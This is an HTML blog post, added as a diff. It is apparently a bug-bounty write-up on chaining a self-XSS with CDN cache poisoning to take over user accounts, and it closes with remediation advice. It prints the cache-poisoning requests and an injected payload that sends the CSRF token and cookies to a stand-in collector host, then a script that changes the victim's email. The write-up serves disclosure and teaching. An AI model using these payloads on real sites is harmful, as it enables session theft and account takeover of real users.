@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; script-src 'self' 'unsafe-inline'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>From Self-XSS to Account Takeover: Chaining Web Cache Poisoning on a Public Bug-Bounty Target · Muhammad Ramis</title>
+<meta name="description" content="A sanitised write-up of how I turned a &quot;won't fix&quot; self-XSS into a zero-click account takeover by abusing a CDN cache that keyed on the wrong inputs. The methodology, the cache key confusion, the payload, the impact rating, and the layered fix." />
+<meta name="author" content="Muhammad Ramis" />
+<link rel="canonical" href="https://ramis.me/blog/cache-poisoning-account-takeover/" />
+<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1" />
+<meta name="keywords" content="web-cache-poisoning, self-xss, account-takeover, cache-key, bug-bounty, burp-suite" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="From Self-XSS to Account Takeover: Chaining Web Cache Poisoning on a Public Bug-Bounty Target" />
+<meta property="og:description" content="A sanitised write-up of how I turned a &quot;won't fix&quot; self-XSS into a zero-click account takeover by abusing a CDN cache that keyed on the wrong inputs. The methodology, the cache key confusion, the payload, the impact rating, and the layered fix." />
+<meta property="og:url" content="https://ramis.me/blog/cache-poisoning-account-takeover/" />
+<meta property="og:site_name" content="Muhammad Ramis" />
+<meta property="og:image" content="https://ramis.me/assets/og.png" />
+<meta property="article:published_time" content="2026-04-02" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="From Self-XSS to Account Takeover: Chaining Web Cache Poisoning on a Public Bug-Bounty Target" />
+<meta name="twitter:description" content="A sanitised write-up of how I turned a &quot;won't fix&quot; self-XSS into a zero-click account takeover by abusing a CDN cache that keyed on the wrong inputs. The methodology, the cache key confusion, the payload, the impact rating, and the layered fix." />
+<meta name="twitter:image" content="https://ramis.me/assets/og.png" />
+<meta name="theme-color" content="#0a0c12" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" onload="this.onload=null;this.rel='stylesheet'" />
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" /></noscript>
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg" />
+<link rel="apple-touch-icon" href="/assets/apple-touch-icon.png" />
+<link rel="stylesheet" href="/assets/css/style.css?v=27" />
+<style>
+  body{background:#0a0c12;color:#cdd3e0;}
+  .bp-nav{display:flex;align-items:center;justify-content:space-between;gap:1rem;max-width:820px;margin:0 auto;padding:1.4rem 1.2rem;}
+  .bp-nav a{color:var(--text-dim);font-weight:600;}
+  .bp-nav a:hover{color:var(--accent);}
+  .bp-brand{font-family:var(--font-display);font-weight:700;color:var(--text);}
+  .bp{width:min(100% - 2.4rem,760px);margin:1.2rem auto 5rem;}
+  .bp__track{font-family:var(--font-mono);font-size:.72rem;letter-spacing:.16em;text-transform:uppercase;color:var(--accent);}
+  .bp h1{font-family:var(--font-display);font-size:clamp(1.8rem,4.5vw,2.7rem);line-height:1.1;letter-spacing:-.02em;margin:.6rem 0 .8rem;color:var(--text);}
+  .bp__meta{font-family:var(--font-mono);font-size:.8rem;color:var(--text-faint);margin-bottom:2.2rem;display:flex;flex-wrap:wrap;gap:.6rem;}
+  .bp__cta{margin-top:3rem;padding-top:1.6rem;border-top:1px solid var(--border);color:var(--text-dim);font-size:.95rem;}
+  .bp__cta .btnrow{display:flex;flex-wrap:wrap;gap:.8rem;margin-top:1rem;}
+  .bp__cta a.primary{background:linear-gradient(100deg,#5cc6dd,#8278d9);color:#07080d;font-weight:700;padding:.7rem 1.3rem;border-radius:999px;}
+  .bp__cta a.ghost{border:1px solid var(--border-strong);color:var(--text);padding:.7rem 1.3rem;border-radius:999px;}
+  .bi{list-style:none;padding:0;margin:1.5rem 0;display:grid;gap:.7rem;}
+  .bi a{display:block;padding:1.1rem 1.2rem;border:1px solid var(--border);border-radius:14px;background:var(--surface);transition:border-color .25s,transform .25s;}
+  .bi a:hover{border-color:var(--accent);transform:translateY(-2px);}
+  .bi__t{display:block;font-family:var(--font-display);font-weight:600;color:var(--text);}
+  .bi__m{display:block;font-family:var(--font-mono);font-size:.72rem;color:var(--text-faint);margin-top:.3rem;}
+</style>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"From Self-XSS to Account Takeover: Chaining Web Cache Poisoning on a Public Bug-Bounty Target","description":"A sanitised write-up of how I turned a \"won't fix\" self-XSS into a zero-click account takeover by abusing a CDN cache that keyed on the wrong inputs. The methodology, the cache key confusion, the payload, the impact rating, and the layered fix.","datePublished":"2026-04-02","dateModified":"2026-04-02","author":{"@type":"Person","name":"Muhammad Ramis","url":"https://ramis.me"},"publisher":{"@type":"Person","name":"Muhammad Ramis"},"mainEntityOfPage":"https://ramis.me/blog/cache-poisoning-account-takeover/","url":"https://ramis.me/blog/cache-poisoning-account-takeover/","image":"https://ramis.me/assets/og.png","keywords":"web-cache-poisoning, self-xss, account-takeover, cache-key, bug-bounty, burp-suite"}</script>
+</head>
+<body>
+<header class="bp-nav">
+  <a class="bp-brand" href="/">Ramis<span style="color:var(--accent)">.</span></a>
+  <a href="/blog/">All writing</a>
+</header>
+<main class="bp">
+  <p class="bp__track">cybersecurity</p>
+  <h1>From Self-XSS to Account Takeover: Chaining Web Cache Poisoning on a Public Bug-Bounty Target</h1>
+  <p class="bp__meta"><span>2026-04-02</span><span>·</span><span>8 min read</span></p>
+  <article class="md">
+<p>Self-XSS is the bug everyone loves to close as "won't fix". You can only fire it in your own session, the argument goes, so where is the victim? On a recent public programme I turned exactly that shrug into a single-click, zero-interaction account takeover by chaining the self-XSS with a web cache poisoning primitive. The cache did the one thing the attacker normally cannot: it served my payload to other people. This is a sanitised, generic write-up of the methodology, the cache key confusion that made it work, the payload, and the fix.</p>
+<h2>The two ingredients</h2>
+<p>I had two findings that were individually weak.</p>
+<p>First, a reflected self-XSS. A profile preferences endpoint echoed an <code>X-Display-Name</code> request header straight into the HTML of the dashboard shell without encoding. It only reflected your own header in your own response, so the triage-bait classification was "self-XSS, informational".</p>
+<p>Second, an aggressive CDN cache in front of the same origin. Static-looking dashboard routes such as <code>/app/home</code> were cached at the edge to shave latency. The cache was supposed to key on path plus a session-scoping value, but it did not.</p>
+<p>Neither is a critical on its own. Together they let me write attacker-controlled JavaScript into a response that the CDN then handed to every authenticated user who loaded <code>/app/home</code>.</p>
+<h2>Finding the cache key confusion</h2>
+<p>The whole attack hinges on what the cache includes in its key. I probed this the standard way: send a request with a junk query parameter and a unique marker, then immediately replay it without the marker and see whether the marker comes back.</p>
+<pre><code>GET /app/home?cb=poison1 HTTP/1.1
+Host: target.example
+X-Display-Name: &lt;marker-9f3a2&gt;
+
+GET /app/home HTTP/1.1
+Host: target.example</code></pre>
+<p>The second, clean request returned <code>marker-9f3a2</code> in the body. That is the entire vulnerability class in one exchange: the response varied on an input (<code>X-Display-Name</code>) that was <em>not</em> part of the cache key. The query string <code>cb</code> was also unkeyed, which is what let me bust and re-prime the cache on demand. The edge was caching a per-user-influenced response under a key shared by all users.</p>
+<p>I confirmed it was a true shared cache and not my own browser by checking the response headers on the clean replay:</p>
+<pre><code>X-Cache: HIT
+Age: 7
+Cache-Control: public, max-age=120</code></pre>
+<p>A <code>HIT</code> with a non-zero <code>Age</code> on a request that carried none of my poisoning input means the edge, not the origin, answered, and it answered with content shaped by a previous request. That is web cache poisoning.</p>
+<h2>Weaponising the chain</h2>
+<p>The plan: send one poisoning request carrying the XSS payload in <code>X-Display-Name</code>, land it in the shared cache entry for <code>/app/home</code>, then let normal users pull the poisoned object.</p>
+<p>The reflected header sat inside a <code>&lt;script&gt;</code> context that built a greeting, so I broke out and used a tidy exfil-plus-pivot payload. Sanitised:</p>
+<pre><code>GET /app/home?cb=poison HTTP/1.1
+Host: target.example
+X-Display-Name: x&lt;/script&gt;&lt;script&gt;
+  fetch('/api/v2/session/token')
+    .then(r=&gt;r.json())
+    .then(d=&gt;fetch('https://collector.attacker.test/c?t='+d.csrf+'&amp;s='+document.cookie));
+&lt;/script&gt;&lt;script&gt;x=1</code></pre>
+<p>Because the dashboard's anti-CSRF token was exposed to same-origin JavaScript via <code>/api/v2/session/token</code>, the payload could read it. With the CSRF token plus the victim's authenticated session, the next stage scripted the email-change and password-reset flow directly from the victim's browser:</p>
+<pre><code>fetch('/api/v2/account/email', {
+  method: 'POST',
+  headers: {'Content-Type':'application/json','X-CSRF-Token': stolenToken},
+  body: JSON.stringify({email: 'attacker+'+Date.now()+'@attacker.test'})
+});</code></pre>
+<p>Once the poisoned entry was cached, every user who hit <code>/app/home</code> until the 120-second TTL expired executed my script in their own session. No link to click, no interaction, no social engineering. They simply loaded the home page. I kept the entry warm by re-sending the poisoning request just before each expiry.</p>
+<h2>Demonstrating impact safely</h2>
+<p>On a live programme you do not mass-exploit real users. I proved the chain end to end against two accounts I controlled: account A sent the poisoning request, account B (a separate browser, separate session, fresh login) loaded <code>/app/home</code>, and my collector received account B's CSRF token and a confirmation that the email-change request returned <code>200</code>. I captured the <code>X-Cache: HIT</code> headers, the collector logs, and a short screen recording, then reported. I rated it Critical: unauthenticated-from-the-victim's-side account takeover affecting any user of a high-traffic authenticated route, with a blast radius equal to the cache's reach.</p>
+<h2>The fix</h2>
+<p>The remediation is layered, and I recommended all of it rather than a single patch:</p>
+<ul><li><strong>Correct the cache key.</strong> Either add <code>X-Display-Name</code> (and any other reflected input) to the <code>Vary</code>/cache key, or far better, never cache authenticated, user-influenced responses. <code>Cache-Control: private, no-store</code> on <code>/app/home</code> killed the shared-cache primitive outright.</li><li><strong>Encode the output.</strong> Context-aware HTML encoding on the reflected header turns the self-XSS back into inert text. This is the real bug; the cache only amplified it.</li><li><strong>Stop unkeyed inputs reaching the origin un-normalised.</strong> The edge should strip or reject unexpected request headers that influence rendering.</li><li><strong>Don't hand CSRF tokens to fetch.</strong> Move anti-CSRF to a <code>SameSite</code> cookie pattern so a script foothold cannot trivially read the token.</li></ul>
+<p>The team shipped <code>no-store</code> on authenticated routes within a day and the encoding fix shortly after.</p>
+<h2>Takeaways</h2>
+<ul><li>A self-XSS plus a shared cache that varies on unkeyed input equals stored XSS for everyone. Re-rate accordingly.</li><li>The cache poisoning test is two requests: poison with a marker, replay clean, check <code>X-Cache</code>/<code>Age</code>.</li><li>Unkeyed query params are a gift: they let you bust and re-prime the cache at will.</li><li>The root cause is usually the missing output encoding and an over-broad cache policy, not anything exotic.</li><li>Always prove impact against your own second account; never poison a production cache used by real users.</li></ul>
+
+  </article>
+  <div class="bp__cta">
+    <p>Written by <strong>Muhammad Ramis</strong>, a software &amp; AI engineer and OSCP+ penetration tester based in Nottingham, UK. Available for consultancy, contract and senior/staff roles.</p>
+    <div class="btnrow">
+      <a class="primary" href="/">View the full portfolio</a>
+      <a class="ghost" href="mailto:hello@ramis.me">Get in touch</a>
+    </div>
+  </div>
+</main>
+</body>
+</html>
